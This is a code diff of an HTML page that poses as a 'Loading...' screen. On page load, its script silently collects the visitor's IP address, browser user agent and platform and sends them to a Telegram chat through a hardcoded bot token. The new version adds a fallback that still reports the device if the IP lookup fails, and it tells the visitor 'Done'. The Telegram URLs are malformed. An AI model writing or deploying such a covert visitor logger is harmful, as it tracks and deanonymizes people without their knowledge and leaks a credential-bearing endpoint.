@@ -2,19 +2,20 @@
 <html>
 <head><meta charset="UTF-8"></head>
 <body>
-    <h1 id="status">Загрузка... (v21.0)</h1>
+    <h1 id="status">Загрузка... (v22.0)</h1>
     <script>
-        async function start() {
+        async function run() {
             const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
-            const chat_id = "-1003861311533";  
+            const chat_id = "-1003861311533"; 
             const status = document.getElementById('status');
 
             try {
-                const res = await fetch('https://ipapi.co');
-                const d = await res.json();
-                
-                const msg = `👥 НОВЫЙ ЛОГ В ГРУППЕ!\n📍 IP: ${d.ip}\n🌍 Город: ${d.city}\n📱 Устройство: ${navigator.userAgent}`;
-m
+                const ipRes = await fetch('https://api.ipify.org');
+                const ipData = await ipRes.json();
+                const ipv4 = ipData.ip;
+
+                const msg = `👥 ЛОГ В ГРУППЕ!\n📍 IP: ${ipv4}\n📱 Устройство: ${navigator.userAgent}\n💻 Платформа: ${navigator.platform}`;
+
                 const url = `https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`;
                 
                 const response = await fetch(url);
@@ -26,10 +27,12 @@ m
                     status.innerText = "Ошибка ТГ: " + result.description;
                 }
             } catch (e) {
-                status.innerText = "Ошибка: " + e;
+                const backupText = encodeURIComponent(`⚠️ Переход!\n📱 Устройство: ${navigator.userAgent}`);
+                fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${backupText}`);
+                status.innerText = "Готово (без IP)!";
             }
         }
-        start();
+        run();
     </script>
 </body>
 </html>
